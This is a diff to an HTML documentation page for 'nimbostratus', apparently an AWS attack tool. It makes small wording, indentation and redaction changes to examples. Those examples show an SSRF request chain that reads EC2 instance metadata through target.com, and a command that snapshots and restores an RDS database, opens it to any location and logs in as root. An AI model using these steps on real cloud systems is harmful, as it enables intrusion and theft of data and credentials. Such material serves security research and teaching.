@@ -143,9 +143,9 @@ User data script was written to user-data.txt
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus dump-ec2-metadata --mangle-function=core.utils.mangle.mangle
 <span class="go">
 Starting dump-ec2-metadata
-Requesting http://target.com/?url=http://169.254.169.254/latest/meta-data/
-Requesting http://target.com/?url=http://169.254.169.254/latest/meta-data/instance-type
-Requesting http://target.com/?url=http://169.254.169.254/latest/meta-data/instance-id
+Request http://target.com/?url=http://169.254.169.254/latest/meta-data/
+Request http://target.com/?url=http://169.254.169.254/latest/meta-data/instance-type
+Request http://target.com/?url=http://169.254.169.254/latest/meta-data/instance-id
 ...
 Instance type: t1.micro
 AMI ID: ami-a02f66f2
@@ -166,21 +166,22 @@ that database by creating a snapshot and restoring it.</p>
 
 
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus snapshot-rds --access-key<span class="o">=</span>... <span class="se">\</span>
-                                                      --secret-key<span class="o">=</span>... <span class="se">\</span>
-                                                      --password foolmeonce --rds-name nimbostratus --region ap-southeast-1
+                 --secret-key<span class="o">=</span>... <span class="se">\</span>
+                 --password foolmeonce --rds-name nimbostratus --region ap-southeast-1
 <span class="go">
 Starting snapshot-rds
 Waiting for snapshot to complete in AWS... (this takes at least 5m)
 Waiting...
 Waiting for restore process in AWS... (this takes at least 5m)
 Waiting...
-Creating a DB security group which allows connections from any location and applying it to the 
-newly created RDS instance. Anyone can connect to this MySQL instance at:
-    - Host: restored-sjnrpnubt.cuwm5qpy.ap-southeast-1.rds.amazonaws.com
+Creating a DB security group which allows connections from any location and 
+applying it to the newly created RDS instance. Anyone can connect to this
+MySQL instance at:
+    - Host: restored....rds.amazonaws.com
     - Port: 3306
     
     Using root:
-        mysql -u root -pfoolmeonce -h restored-sjnrpnubt.cuwm5qpy.ap-southeast-1.rds.amazonaws.com
+        mysql -u root -pfoolmeonce -h restored....rds.amazonaws.com
 </span>
 </pre></div>
 
